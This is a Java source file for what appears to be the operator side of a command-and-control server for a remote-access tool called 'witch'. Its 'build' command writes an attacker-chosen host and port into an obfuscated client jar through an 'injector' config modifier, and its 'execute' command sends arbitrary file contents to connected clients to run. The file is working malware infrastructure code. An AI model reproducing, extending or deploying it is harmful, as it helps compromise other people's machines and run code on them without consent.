package me.soda.witch.server.server;

import me.soda.witch.server.Main;
import me.soda.witch.server.injector.ConfigModifier;
import me.soda.witch.server.web.WSServer;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.File;
import java.io.FileInputStream;

public class CommandHandler {
    private static final Logger LOGGER = LoggerFactory.getLogger(CommandHandler.class);

    public static void handle(String in, Server server, WSServer wsServer) {
        String[] msgArr = in.split(" ");
        if (msgArr.length > 0) {
            try {
                switch (msgArr[0]) {
                    case "stop" -> {
                        Main.inputStream.close();
                        server.stop();
                        wsServer.stop();
                    }
                    case "build" -> {
                        try {
                            if (msgArr.length == 4) {
                                ConfigModifier.modifyCfg("witch-1.0.0-obfuscated.jar", msgArr[1], msgArr[2], Integer.parseInt(msgArr[3]));
                                LOGGER.info("Build finished.");
                            }
                        } catch (Exception e) {
                            LOGGER.warn("build <output> <host> <port>");
                        }
                    }
                    case "execute" -> {
                        if (msgArr.length < 2) return;
                        File file = new File(in.substring(msgArr[0].length() + 1));
                        try (FileInputStream is = new FileInputStream(file)) {
                            server.send.trySendBytes(msgArr[0], is.readAllBytes());
                        }
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
                LOGGER.error(e.getMessage());
            }
        }
    }
}
